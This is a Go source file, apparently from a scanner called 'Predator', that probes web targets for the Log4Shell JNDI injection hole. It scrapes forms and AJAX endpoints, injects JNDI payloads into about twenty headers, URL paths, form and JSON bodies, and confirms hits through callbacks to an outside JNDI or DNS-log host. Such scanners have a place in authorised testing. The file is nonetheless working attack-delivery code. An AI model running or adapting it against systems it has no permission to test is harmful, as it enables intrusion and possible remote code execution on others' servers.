package log4j

import (
	"Predator/module/v1/jndi"
	"Predator/pkg/config"
	"Predator/pkg/utils"
	"net/url"
	"regexp"
	"strings"
)

func Check(Url string) bool {
	if (config.CeyeApi != "" && config.CeyeDomain != "") || jndi.JndiAddress != "" {
		var host = "null"
		randomstr := utils.RandomStr()
		if ux, err := url.Parse(Url); err == nil {
			host = strings.Replace(ux.Host, ":", ".", -1)
		}
		domainx, intputs := getinputurl(Url)
		domainx = utils.RemoveDuplicateOfStringArray(append(domainx, Url))
		intputs = append(intputs, "x")
		for _, domain := range domainx {
			for _, payload := range log4jJndiPayloads {
				var uri string
				if jndi.JndiAddress != "" {
					uri = jndi.JndiAddress + "/" + randomstr + "/"
				} else if config.CeyeApi != "" && config.CeyeDomain != "" {
					uri = randomstr + "." + host + "." + config.CeyeDomain
				}
				payload = strings.Replace(payload, "dnslog-url", uri, -1)
				header := make(map[string]string)
				header["Content-Type"] = "application/x-www-form-urlencoded"
				header["User-Agent"] = payload
				header["Referer"] = payload
				header["X-Client-IP"] = payload
				header["X-Remote-IP"] = payload
				header["X-Remote-Addr"] = payload
				header["X-Forwarded-For"] = payload
				header["X-Originating-IP"] = payload
				header["Originating-IP"] = payload
				header["CF-Connecting_IP"] = payload
				header["True-Client-IP"] = payload
				header["Originating-IP"] = payload
				header["X-Real-IP"] = payload
				header["Forwarded"] = payload
				header["X-Api-Version"] = payload
				header["X-Wap-Profile"] = payload
				header["Contact"] = payload
				header["Forwarded"] = payload
				header["X-Device"] = payload
				header["Token"] = payload
				header["Cookie"] = "JSESSIONID=" + payload
				_, _ = utils.HttpRequset(domain+"/"+payload, "GET", "", false, header)
				_, _ = utils.HttpRequset(Url, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
				_, _ = utils.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
				header["Content-Type"] = "application/json"
				_, _ = utils.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
			}
		}
		if jndi.JndiAddress != "" {
			if jndi.Jndilogchek(randomstr) {
				return true
			}
		}
		if config.CeyeApi != "" && config.CeyeDomain != "" {
			if utils.Dnslogchek(randomstr) {
				return true
			}
		}
	}
	return false
}

func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
	req, err := utils.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil, nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = utils.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil, nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if strings.Contains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	inputreg := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?)['"].*?>`).FindAllStringSubmatch(req.Body, -1)
	for _, intput := range inputreg {
		inputlist = append(inputlist, intput[1])
	}
	return loginurl, inputlist
}
